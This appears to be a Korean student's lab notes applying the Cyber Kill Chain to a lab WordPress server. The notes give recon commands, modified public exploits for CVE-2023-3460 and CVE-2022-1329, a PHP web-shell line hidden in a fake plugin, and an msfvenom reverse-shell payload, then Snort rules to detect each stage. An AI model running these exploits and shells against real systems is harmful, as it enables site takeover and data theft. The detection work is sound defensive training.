
## Cyber Kill Chain이란?

- 사이버 보안 모델 중 하나로, **록히드 마틴(Lockheed Martin)** 이 최초로 발표
- 군사 공격 개념에서 출발했으며, 공격(침입) 과정을 일련의 순차적인 단계로 나누어 분석함


`1.정찰 → 2. 무기화 → 3. 전달 → 4. 공격 실행 → 5. 설치 → 6. C&C → 7. 목표 달성`



**사전 준비**

1. `192.168.0.0/24` 대역의 공격자 PC(Kali)에서 `192.168.30.1` 접근 시 pfSense 관리자 페이지가 뜬다면, **Advanced에서 프로토콜을 HTTPS로 변경**
2. 공격자 PC(Kali)에 한글 폰트 설치

---

## 정찰


### nmap 호스트 식별 (ping 스윕)


```bash
nmap -sn 192.168.0.0/24
```

- `-sn` : 포트 스캔 없이 호스트 생존 여부만 검사 (구 `-sP`)


### nmap 서비스·버전·전체 포트 스캔


```bash
nmap -sV -sC -p- 192.168.0.130
```

- `-sV` : 버전 탐지 (Version Detection)
- `-sC` : 기본 스크립트 스캔 (Default Script Scanning)
- `-p-` : 전체 포트 스캔 (1 – 65535)
- 열려있는 포트에서 어떤 서비스가 실행 중인지(+정확한 버전) 확인
- 익명 FTP 접속 허용 여부, SSH 호스트 키 확인, robots.txt 분석 등 기본 설정 오류·위험 요소 스캐닝
- 기본 1,000개 주요 포트(well-known port)뿐 아니라 1 – 65535번 포트를 빠짐없이 스캔


### wpscan 도구 활용

- API Key 발급: [https://wpscan.com/register/](https://wpscan.com/register/) 회원가입 → 메일 인증 → 로그인 시 API 키 발급
![](../Images/Pasted%20image%2020261019111502.png)
```bash
# 발급받은 키를 환경변수로 등록 
export WP_SCAN_KEY=<WPSCAN_API_TOKEN>

# 공격적 플러그인 탐지 (숨겨진 취약점 정보까지 수집)
wpscan --url http://192.168.0.130 --api-token $WP_SCAN_KEY --plugins-detection aggressive

# 기본 스캔
wpscan --url http://192.168.0.130 --api-token $WP_SCAN_KEY
```

- `--plugins-detection aggressive` : 플러그인을 적극적으로 탐색해 숨겨진 취약점(정보)까지 수집

#### 탐지된 주요 취약점

| 플러그인            | 버전    | CVE           | 내용                         |
| --------------- | ----- | ------------- | -------------------------- |
| ultimate-member | 2.6.6 | CVE-2023-3460 | 비인가자가 관리자 계정을 생성할 수 있는 취약점 |
| elementor       | 3.6.1 | CVE-2022-1329 | 파일 업로드 → RCE로 이어질 수 있는 취약점 |



![](../Images/Pasted%20image%2020261019111435.png)

핸드러 run 상태로 열어두기
새 터미널 열어서 `elementor--pro plugin` 올린 거 확인
![](../Images/Pasted%20image%2020261020095050.png)
![](../Images/Pasted%20image%2020261020095108.png)

kali에 `http_shell` 파일 있는지 확인

![](../Images/Pasted%20image%2020261019111809.png)

새 터미널에서, RCE로 다운로드 + 실행
![](../Images/Pasted%20image%2020261020095131.png)
---
## 2. 무기화 (Weaponization)

> 초기 침투용 Exploit 준비

### CVE-2023-3460 (Ultimate Member)

- Ultimate Member 플러그인은 사용자 등록 시 특정 메타데이터 키를 사용자가 직접 수정하지 못하도록 **블랙리스트(Black List) 필터링** 방식을 사용
- 필터링 로직에 결함이 있어 **대소문자 혹은 특정 인코딩**으로 우회 가능
- 공격 흐름: 회원가입 요청 패킷에 조작된 필드 포함 전송 → 필터링 로직 우회 값이 서버에서 그대로 처리 → 일반 사용자여야 할 요청이 **관리자(administrator) 권한 계정**으로 생성
- 인증 없이 원격에서 최고 권한(WordPress 관리자) 계정 생성·탈취 가능 → **CVSS 9.8 (Critical)**



```bash
mkdir ~/Exploit
cd ~/Exploit
git clone https://github.com/gbrsh/CVE-2023-3460.git
cd CVE-2023-3460
ls -al          # exploit.py 존재 확인
vim exploit.py
```

![](../Images/Pasted%20image%2020261019112752.png)


```python
# 계정 정보 설정
username = "mooniexploit"
password = "mooni123"
email    = "mhj2973@naver.com"

# 48~52행: form_id 파싱 라인 추가
try:
    r = s.get(f'{target}/index.php/register/', headers=headers, verify=False)
    nonce = re.search(r"name=\"_wpnonce\" value=\"(.{10})\"", r.text).groups()[0]
    # ↓ 아래 라인 추가
    form_id = re.search(r"name=\"form_id\" id=\"form_id_(.{1})\"", r.text).groups()[0]
    print(Fore.GREEN + f"{nonce}")

# 74~79행: 응답 상태코드 조건 수정
r = s.post(f'{target}/index.php/register/', data=data, headers=headers, verify=False)
# (삭제) if r.history[0].status_code == 302:
if r.status_code == 200 or r.status_code == 301 or r.status_code == 302:
    print(Fore.GREEN + f'done')
else:
    print(Fore.RED + f'error...')
exit()

# 108행: form_id 파라미터 삭제
# add_admin(args.url, 6)  →  add_admin(args.url)
```
![](../Images/Pasted%20image%2020261019112856.png)
### CVE-2022-1329 (Elementor)

- **Elementor(무료) 플러그인**의 AJAX 기능에 권한 검증 로직이 부적절/누락됨
    - 선행 조건: 로그인된(authenticated) 사용자 필요
- 서버에 악성 PHP 파일을 설치하고 **RCE(원격 코드 실행)** 가능


```bash
cd ~/Exploit
git clone https://github.com/Grazee/CVE-2022-1329-Wordpress-Elementor-RCE.git
mv CVE-2022-1329-Wordpress-Elementor-RCE CVE-2022-1329   # 실제 클론 폴더명 확인 후 맞추기
vim /home/kali/Exploit/CVE-2022-1329/poc.py
```

**poc.py 수정 사항**

```python
payloadFileName = 'elementor-pro.zip'
baseUrl  = 'http://192.168.0.200/'
username = "schexploit"
password = "Schexploit123"
...
regexp = re.compile('"ajax":\\{"url":".+admin\\-ajax\\.php","nonce":"(.+?)"\\}')
```




**악성 플러그인 페이로드 제작**


```bash
cd ~/Exploit/CVE-2022-1329/
unzip elementor-pro.zip
vim /home/kali/Exploit/CVE-2022-1329/elementor-pro/elementor-pro.php
```


```php
<?php
  // phpinfo();                                  // phpinfo 삭제
  @isset($_GET['cmd']) && system($_GET['cmd']);  // RCE용 코드 추가
```


```bash
cd ~/Exploit/CVE-2022-1329/
rm elementor-pro.zip                       # 기존 zip 삭제
zip -ry elementor-pro.zip elementor-pro    # 수정한 코드 재압축
```


### Meterpreter 리버스 쉘 생성 (msfvenom)



```bash
cd ~/Exploit
msfvenom -p linux/x64/meterpreter_reverse_http LHOST=<공격자_IP> LPORT=80 -f elf -o http_shell
# 예) msfvenom -p linux/x64/meterpreter_reverse_http LHOST=192.168.0.132 LPORT=80 -f elf -o http_shell
```

- **msfvenom** : Metasploit 프레임워크에 포함된 독립형 페이로드 생성·인코딩 도구
- **meterpreter** : Metasploit의 Post-Exploit 단계 페이로드. 침투 후 시스템 제어·정보 탈취 등 다양한 사후 행위를 수행할 수 있는 대화형 쉘(Shell)을 제공


**공격 시도**

```bash
python3 ./CVE-2023-3460/exploit.py http://192.168.0.200
```

![](../Images/Pasted%20image%2020261019141654.png)










![](../Images/meterpreterroot.mp4)

dump 데이터 Value 데이터 확인 가능
![](../Images/Pasted%20image%2020261020103402.png)


덤프 데이터 다운로드 완료
![](../Images/Pasted%20image%2020261020103803.png)


---


kali에서 nmap 적용

```bash
ping 10.10.30.100                              # Protocol을 Any로 했으면 응답 옴
curl -I http://10.10.30.100/                   # 웹 응답 확인

# 룰 동작 확인
curl -A "WPScan test" http://10.10.30.100/
curl -A "Nmap Scripting Engine" http://10.10.30.100/

# 실제 정찰
nmap -Pn -sV -sC 10.10.30.100
wpscan --url http://10.10.30.100/ -e u,vp
```


Pfsense Snort Rule 설정
```snort
alert tcp any any -> any any (msg:"[RECON] Nmap NSE User-Agent"; flow:to_server,established; content:"User-Agent|3A|"; http_header; content:"Nmap Scripting Engine"; http_header; nocase; classtype:attempted-recon; sid:1000001; rev:1;)
alert tcp any any -> any any (msg:"[RECON] Nmap -sV HTTP probe"; flow:to_server,established; content:"/nice ports,/Trinity.txt.bak"; http_uri; nocase; classtype:attempted-recon; sid:1000002; rev:1;)
alert tcp any any -> any any (msg:"[RECON] WPScan User-Agent"; flow:to_server,established; content:"User-Agent|3A|"; http_header; content:"WPScan"; http_header; nocase; classtype:attempted-recon; sid:1000003; rev:1;)
alert tcp any any -> any any (msg:"[RECON] WordPress user enumeration"; flow:to_server,established; content:"/wp-json/wp/v2/users"; http_uri; nocase; classtype:attempted-recon; sid:1000004; rev:1;)
alert tcp any any -> any any (msg:"[RECON] WordPress plugin enumeration"; flow:to_server,established; content:"/wp-content/plugins/"; http_uri; nocase; detection_filter:track by_src, count 30, seconds 10; classtype:attempted-recon; sid:1000005; rev:1;)
```

Pfsense Packet Capture

![](../Images/Pasted%20image%2020261020114311.png)


2. CVE-2023-3460 / CVE-2022-1329 탐지 Snort Rule 만들기
```snort
# CVE-2023-3460 : Ultimate Member 권한 상승 (role/capability 주입)
alert tcp any any -> 10.10.30.100 80 (msg:"[CVE-2023-3460] Ultimate Member privilege escalation attempt"; flow:to_server,established; content:"POST"; http_method; content:"wp_capabilities"; http_client_body; nocase; classtype:web-application-attack; sid:1000010; rev:1;)

alert tcp any any -> 10.10.30.100 80 (msg:"[CVE-2023-3460] Ultimate Member admin role injection"; flow:to_server,established; content:"POST"; http_method; content:"um_role"; http_client_body; nocase; content:"administrator"; http_client_body; nocase; classtype:web-application-attack; sid:1000011; rev:1;)

# CVE-2022-1329 : Elementor Pro 임의 파일 업로드
alert tcp any any -> 10.10.30.100 80 (msg:"[CVE-2022-1329] Elementor Pro unauthorized action"; flow:to_server,established; content:"POST"; http_method; content:"/wp-admin/admin-ajax.php"; http_uri; content:"elementor"; http_client_body; nocase; content:".php"; http_client_body; nocase; classtype:web-application-attack; sid:1000012; rev:1;)

# 웹셸 업로드 경로 접근
alert tcp any any -> 10.10.30.100 80 (msg:"[WEBSHELL] PHP access under uploads directory"; flow:to_server,established; content:"GET"; http_method; content:"/wp-content/uploads/"; http_uri; nocase; content:".php"; http_uri; nocase; classtype:web-application-attack; sid:1000013; rev:1;)

# 업로드된 웹셸의 C2 비콘 (앞 캡처의 /cml_ 패턴)
alert tcp 10.10.30.100 any -> any 80 (msg:"[C2] Webshell beacon /cml_ pattern"; flow:to_server,established; content:"GET"; http_method; content:"/cml_"; http_uri; classtype:trojan-activity; sid:1000014; rev:1;)
```



사전에 알아둬야 할 짧 지식?!?
- post로 보내는 웹 요청의 파라미터는 웹 로그에서 식별할 수 없음. 즉 다른 방법을 통해 POST Request의 바디값을 확인해야 함. --> Wireshark에서 분석 진행 필요
	- 이거에 따라 Wireshark에서 출력한 pfsense dump 데이터를 열어서 확인하면 좋음


1. 관제망 Elastic ELK 서버에서 관측 시 공격 대상(Kali)가 관측됨
![](../Images/Pasted%20image%2020261020142550.png)


 2. Packet Capture한 곳에서 download 받은 패킷을 분석 PC나 로컬에서 가지고 나가야 한다.
	 1. 여기에서 pfsense에서 왜 HTTP Post method를 못잡고 있는지는 모르겠어서 다른 서버로 바꿔 교체하여 새롭게 패킷 필터를 잡았다.
	
 ![](../Images/Pasted%20image%2020261020151916.png)

3. 